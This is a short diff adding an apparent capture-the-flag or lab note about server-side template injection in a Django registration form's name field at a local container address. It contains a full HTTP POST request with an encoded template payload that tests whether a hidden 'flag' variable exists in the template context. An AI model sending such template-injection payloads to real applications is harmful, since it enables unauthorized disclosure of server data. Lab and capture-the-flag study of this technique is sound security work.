@@ -1,0 +1,8 @@
+# SSTI on registration step 1 name field. The name is evaluated as a Django template variable. The comparison name == flag matched, confirming the flag variable exists in the template context. The flag variable is truthy but renders as empty string when accessed directly.
+
+POST /accounts/register/step1/ HTTP/1.1
+Host: 172.17.0.1:38839
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 113
+
+csrfmiddlewaretoken=TOKEN&name=%7B%25+if+name+%3D%3D+flag+%25%7DMATCH%7B%25+endif+%25%7D&password=TestPass1234%21
